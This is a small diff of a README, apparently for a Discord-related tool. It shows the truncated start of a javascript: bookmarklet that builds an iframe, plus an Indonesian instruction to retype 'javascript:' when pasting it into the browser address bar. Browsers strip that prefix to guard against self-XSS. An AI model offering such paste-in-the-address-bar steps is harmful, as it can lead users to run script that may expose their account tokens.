@@ -10,7 +10,7 @@ javascript:var i = document.createElement('iframe');i.onload = function(){var lo
 
 ![image](https://github.com/zrhraJETTOKOSUTA/discord-send/assets/122523974/77a83d47-ad01-41ff-a1f5-e1cf7e005112)
 
-Kamu harus mengetik ulang ``` javascript: dibagian awal karna biasanya suka ilang sendiri pas paste di bar
+Kamu harus mengetik ulang javascript: dibagian awal karna biasanya suka ilang sendiri pas paste di bar
 
 
 # Let,s Run
